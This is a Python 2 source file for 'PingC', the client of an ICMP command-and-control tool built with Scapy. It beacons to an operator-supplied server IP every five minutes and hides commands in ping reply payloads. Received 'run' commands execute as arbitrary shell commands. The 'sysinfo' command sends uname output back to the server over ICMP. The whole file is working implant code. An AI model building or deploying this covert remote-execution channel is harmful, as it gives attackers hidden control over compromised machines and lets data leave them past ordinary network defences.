#! /usr/bin/env python

# PingC ICMP command and control client application
# by NoCow
# This is the client side application for my ICMP C2 project. The client will periodically ping the C2 server
#  and receive commands in the data portion of the reply. I am currently using Scapy for the packet building
# Usage: ./pingc.py <IP>

import sys
import time
import signal
import subprocess as sub
from scapy.all import sr,sr1,ICMP,IP

def handler(signum, frame):
        print 'Bye!'
        sys.exit()

def sendPingRequest(command):
	packet=IP(dst=sys.argv[1])/ICMP()/command
        #packet.show()
        p=sr1(packet,timeout=5)
        print "[*] String sent to C2 server: " + command
	return p

def processReply(p):
	try:
		response=p['Raw'].load
        except:
		print "[X] Error: ", sys.exc_info()[0]
		return
	# Check ICMP data for 'run' command
        print "[*] String received from C2 server: " + p['Raw'].load
        if 'run' in response:
        	print "[*] Master says run command: " + response[4:]
                command = response[4:]
                command.split()
                proc = sub.Popen(command,stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
		print output
                print errors
	elif 'sysinfo' in response:
        	print "[*] Master requesting sysinfo"
		proc = sub.Popen(['uname -a'],stdout=sub.PIPE,stderr=sub.PIPE,shell=True)
                output, errors = proc.communicate()
                p=sendPingRequest('sysinfo %s' % output)
		if p:	
			processReply(p)
		print output
                print errors
	elif 'thanks' in response:
		print "[*] Request received"
		print "[*] Sleeping for 10"
        elif 'sleep' in response:
		seconds = response[6:]
                print "[*] Master says sleep for %s seconds" % (seconds)
                print "[*] Sleeping..."
                time.sleep(int(seconds))
                p=sendPingRequest("What shall I do master?")
                processReply(p)

def main(argv):
	while True:
		if len(argv) < 1:
			print "----------------------------"
			print "PingC Usage"
			print " ./pingc.py <IP>"
			print "----------------------------"
			exit()
		signal.signal(signal.SIGINT, handler)
		p=sendPingRequest("What shall I do master?")
		if p:
			processReply(p)
		print "[*] Sleeping now..."
		time.sleep(300)

if __name__ == "__main__":
   main(sys.argv[1:])

